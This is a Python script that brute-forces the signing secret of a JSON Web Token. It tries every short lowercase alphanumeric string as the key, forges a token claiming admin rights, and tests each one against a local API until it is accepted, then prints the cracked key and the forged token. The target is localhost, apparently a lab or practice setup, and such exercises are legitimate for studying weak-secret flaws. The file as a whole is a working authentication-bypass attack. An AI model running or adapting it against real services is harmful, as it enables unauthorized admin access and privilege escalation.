from itertools import combinations_with_replacement
import jwt
import requests
import time
import datetime


url = "http://localhost:8080/api/users"
characters = '0123456789azertyuiopqsdfghjklmwxcvbn'
max_length = 6

start = time.perf_counter()

for r in range(1, max_length+1):
    for combo in combinations_with_replacement(characters, r=r):
        key = ''.join(combo)
        print(key)
        token = jwt.encode({"isadmin": True}, str(key))

        #testing the token
        header={"Authorization": f"Bearer {token}"}
        res = requests.get(url, headers=header)
        if isinstance(res.json(), list):
            print(f"{time.perf_counter()-start} seconds")
            print(f"KEY={key}")
            print(token)
            break